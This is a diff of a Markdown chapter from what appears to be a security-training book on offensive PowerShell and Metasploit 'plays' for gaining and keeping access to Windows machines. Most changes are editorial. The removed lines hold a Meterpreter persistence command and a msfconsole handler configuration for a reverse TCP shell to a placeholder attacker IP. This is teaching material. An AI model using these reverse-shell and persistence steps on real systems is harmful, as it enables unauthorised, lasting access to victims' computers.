@@ -247,17 +247,6 @@ So what we are doing is making our viruses and payloads look like chameleons or 
 
 #### PowerShell Exploitation via Executable C/- [Psmsf](https://github.com/nixawk/psmsf) {#vps-identify-risks-powershell-exploitation-via-executable-psmsf}
 
-
-
-
-
-
-
-
-
-
-
-
 ![](images/HandsOnHack.png)
 
 I> ## Synopsis
@@ -614,52 +603,9 @@ G> Now you need to get the `doc.chm` onto your targets machine or a network shar
 
 #### Adding Persistence C/- Meterpreter {#vps-identify-risks-adding-persistence-co-meterpreter}
 
+Metasploit had a Meterpreter script called [`persistence.rb`](https://www.offensive-security.com/metasploit-unleashed/meterpreter-service/) that could create a persistent (survive reboots, and most other actions a user will take) reverse shell, these scripts are no longer supported. If you try to use it, you will probably get an error like: "`windows version of Meterpreter is not supported with this Script`"
 
-
-
-Metasploit has a Meterpreter script called `persistence.rb` that can create a persistent (survive reboots, and most other actions a user will take) 
-
-
-
-
-4444
-run persistence -U -i 20 -p 4444 -r <listener-attack-ip>
-
-
-
-G> 1. `powershell_msf.rc` (the resource file we can feed to `msfconsole`), looks like:  
-G> `use exploit/multi/handler`  
-G> `set payload windows/meterpreter/reverse_tcp`  
-G> `set LHOST <listener-attack-ip>`  
-G> `set LPORT 4444`  
-G> `set ExitOnSession false`  
-G> `set EnableStageEncoding true`  
-G> `exploit -j`  
-
-
-
-Use the `exploit/windows/local/persistence` module
-
-
-
-
-
-
-
-
-
-I> ## Synopsis
-I>
-I> 
-
-
-You can find the video of how this attack is played out at []().
-
-{icon=bomb}
-G> ## The Play
-G>
-G> 
-
+Now the [`exploit/windows/local/persistence`](https://github.com/rapid7/metasploit-framework/issues/6904) module is recommended for persistence. AV picks this up on reboot though, so you probably will not get far with this. 
 
 #### Adding Persistence C/- [PowerSploit](https://github.com/PowerShellMafia/PowerSploit/) {#vps-identify-risks-adding-persistence-co-powersploit}
 
@@ -670,21 +616,11 @@ We can do better than `meterpreter`. PowerSploit has a module called [Persistenc
 
 I had a play with the `nishang` [`Add-Persistence.ps1`](https://github.com/samratashok/nishang/blob/1b5aca1a1eb170befccf1d111e8902285d553289/Utility/Add-Persistence.ps1) script, which may be useful for creating post-exploitation persistence, but I was looking for a solution to create an atomic persistent exploit, which is what PowerSploit provides.
 
-
-
-
 I> ## Synopsis
 I>
-I> In this play we extend the [PowerShell Exploitation via Office Documents](#powershell-exploitation-via-office-documents) play with the help from PowerSploit
+I> In this play we extend the [PowerShell Exploitation via Office Documents](#powershell-exploitation-via-office-documents) play with the help from PowerSploit. The play below should explain everything.
 
-
-
-
-
-
-
-
-You can find the video of how this attack is played out at []().
+You can find the video of how this attack is played out at [https://youtu.be/al9RX40QuXU](https://youtu.be/al9RX40QuXU).
 
 If you do not already have `PowerSploit` on your Windows attack machine, go ahead and clone it as discussed in the Tooling Setup chapter of Fascicle 0.
 
@@ -795,26 +731,6 @@ T> The easiest way to kill many instances of `powershell` when you are experimen
 T> `taskkill /F /IM powershell.exe /T`
 
 There are many ways to achieve persistence. I have not included any lateral movement or privilege escalation amongst these PowerShell plays, but feel free to take your post exploitation further. Even the tools we have used in these plays have a good variety of both.
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 
 ### Unnecessary and Vulnerable Services 
 
